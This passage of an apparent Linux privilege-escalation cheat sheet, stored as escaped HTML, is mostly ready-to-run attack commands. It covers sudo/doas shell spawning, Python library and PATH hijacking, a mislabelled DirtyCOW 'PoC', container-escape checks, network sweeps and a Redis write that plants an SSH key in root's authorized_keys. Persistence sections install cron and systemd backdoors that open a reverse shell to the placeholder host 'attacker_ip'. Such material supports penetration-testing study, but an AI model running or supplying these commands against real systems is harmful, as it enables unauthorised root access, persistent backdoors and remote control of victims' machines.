class=\"cl\"\u003e\u003cspan class=\"s\"\u003eimport os\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eos.execv(\u0026#34;/bin/sh\u0026#34;, [\u0026#34;sh\u0026#34;])\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Execute with doas/sudo\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edoas /usr/bin/dstat --exploit\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"python-library-hijacking\"\u003ePython Library Hijacking\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check Python path\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epython -c \u003cspan class=\"s2\"\u003e\u0026#34;import sys; print(\u0026#39;\\n\u0026#39;.join(sys.path))\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Find writable Python directories\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epython -c \u003cspan class=\"s2\"\u003e\u0026#34;import sys; print(\u0026#39;\\n\u0026#39;.join([p for p in sys.path if __import__(\u0026#39;os\u0026#39;).access(p, __import__(\u0026#39;os\u0026#39;).W_OK)]))\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Create malicious module\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;import os; os.execv(\u0026#34;/bin/sh\u0026#34;, [\u0026#34;sh\u0026#34;])\u0026#39;\u003c/span\u003e \u0026gt; /writable/python/path/exploit.py\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Import in vulnerable application\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epython -c \u003cspan class=\"s2\"\u003e\u0026#34;import exploit\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"binary-wrapper-exploitation\"\u003eBinary Wrapper Exploitation\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Create wrapper script for allowed commands\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat \u0026gt; /tmp/malicious_script \u003cspan class=\"s\"\u003e\u0026lt;\u0026lt; \u0026#39;EOF\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e#!/bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e/bin/bash -p\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003echmod +x /tmp/malicious_script\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# If PATH manipulation is possible\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003ePATH\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/tmp:\u003cspan class=\"nv\"\u003e$PATH\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Or create binary with same name as allowed command\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecp /bin/bash /tmp/allowed_binary_name\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"kernel-and-system-exploits\"\u003eKernel and System Exploits\u003c/h2\u003e\n\u003ch3 id=\"kernel-version-checking\"\u003eKernel Version Checking\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Kernel version\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003euname -r\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat /proc/version\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check for known kernel exploits\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esearchsploit linux kernel \u003cspan class=\"k\"\u003e$(\u003c/span\u003euname -r\u003cspan class=\"k\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Distribution-specific exploits\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elsb_release -a\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat /etc/os-release\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"common-kernel-exploits\"\u003eCommon Kernel Exploits\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Dirty COW (CVE-2016-5195)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Affects Linux kernel versions 2.6.22 to 4.8.3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# DirtyCOW PoC\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;int main() { setuid(0); system(\u0026#34;/bin/bash\u0026#34;); return 0; }\u0026#39;\u003c/span\u003e \u0026gt; /tmp/cow.c\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egcc -o /tmp/cow /tmp/cow.c\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check for vulnerable kernel\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e[[\u003c/span\u003e \u003cspan class=\"k\"\u003e$(\u003c/span\u003euname -r \u003cspan class=\"p\"\u003e|\u003c/span\u003e cut -d. -f1-2\u003cspan class=\"k\"\u003e)\u003c/span\u003e \u0026lt; \u003cspan class=\"s2\"\u003e\u0026#34;4.9\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e]]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;Potentially vulnerable to DirtyCOW\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"container-escape-techniques\"\u003eContainer Escape Techniques\u003c/h2\u003e\n\u003ch3 id=\"docker-container-detection\"\u003eDocker Container Detection\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check if running in container\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat /proc/1/cgroup \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep docker\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003els -la /.dockerenv\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check for container runtime\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eps aux \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep -E \u003cspan class=\"s2\"\u003e\u0026#34;(docker|containerd|runc)\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check capabilities\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/sbin/getcap -r / 2\u0026gt;/dev/null\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecapsh --print\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"container-privilege-escalation\"\u003eContainer Privilege Escalation\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check for privileged container\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat /proc/self/status \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep Cap\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check for host filesystem mounts\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emount \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep -E \u003cspan class=\"s2\"\u003e\u0026#34;/(proc|sys|dev)\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Look for Docker socket\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efind / -name \u003cspan class=\"s2\"\u003e\u0026#34;docker.sock\u0026#34;\u003c/span\u003e 2\u0026gt;/dev/null\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check for host processes visible\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eps aux \u003cspan class=\"p\"\u003e|\u003c/span\u003e wc -l\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"network-based-privilege-escalation\"\u003eNetwork-Based Privilege Escalation\u003c/h2\u003e\n\u003ch3 id=\"internal-network-discovery\"\u003eInternal Network Discovery\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Network interfaces\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eip addr show\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eifconfig -a\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# ARP table\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003earp -a\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eip neigh show\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Network connections\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ess -tulnp\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetstat -tulnp\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Port scanning internal network\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efor\u003c/span\u003e i in \u003cspan class=\"o\"\u003e{\u003c/span\u003e1..254\u003cspan class=\"o\"\u003e}\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003edo\u003c/span\u003e ping -c \u003cspan class=\"m\"\u003e1\u003c/span\u003e 192.168.1.\u003cspan class=\"nv\"\u003e$i\u003c/span\u003e \u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u0026gt;/dev/null \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;192.168.1.\u003c/span\u003e\u003cspan class=\"nv\"\u003e$i\u003c/span\u003e\u003cspan class=\"s2\"\u003e is up\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003edone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"service-exploitation\"\u003eService Exploitation\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check for internal services\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -sT -O localhost\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ess -tlnp \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep LISTEN\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Database connections\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emysql -u root -p\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epsql -U postgres\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Redis exploitation\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eredis-cli\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eCONFIG GET dir\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eCONFIG SET dir /root/.ssh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eCONFIG SET dbfilename authorized_keys\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSET crackit \u003cspan class=\"s2\"\u003e\u0026#34;\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSAVE\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"persistence-mechanisms\"\u003ePersistence Mechanisms\u003c/h2\u003e\n\u003ch3 id=\"ssh-key-injection\"\u003eSSH Key Injection\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Generate SSH key pair\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003essh-keygen -t rsa -f /tmp/key\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Add public key to authorized_keys\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...\u0026#34;\u003c/span\u003e \u0026gt;\u0026gt; /root/.ssh/authorized_keys\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...\u0026#34;\u003c/span\u003e \u0026gt;\u0026gt; /home/user/.ssh/authorized_keys\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Set proper permissions\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003echmod \u003cspan class=\"m\"\u003e600\u003c/span\u003e /root/.ssh/authorized_keys\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003echmod \u003cspan class=\"m\"\u003e700\u003c/span\u003e /root/.ssh\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"cron-job-backdoors\"\u003eCron Job Backdoors\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Add malicious cron job\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;* * * * * /bin/bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/attacker_ip/port 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;\u003c/span\u003e \u0026gt;\u0026gt; /etc/crontab\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# User-specific cron\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecrontab -e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Add: * * * * * /path/to/backdoor\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"service-backdoors\"\u003eService Backdoors\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Create systemd service\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat \u0026gt; /etc/systemd/system/backdoor.service \u003cspan class=\"s\"\u003e\u0026lt;\u0026lt; \u0026#39;EOF\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e[Unit]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eDescription=System Backdoor\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eAfter=network.target\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e[Service]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eType=simple\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eUser=root\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eExecStart=/bin/bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/attacker_ip/port 0\u0026gt;\u0026amp;1\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eRestart=always\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e[Install]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eWantedBy=multi-user.target\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemctl \u003cspan class=\"nb\"\u003eenable\u003c/span\u003e backdoor.service\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemctl start backdoor.service\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"automated-enumeration-tools\"\u003eAutomated Enumeration Tools\u003c/h2\u003e\n\u003ch3 id=\"linpeas\"\u003eLinPEAS\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" 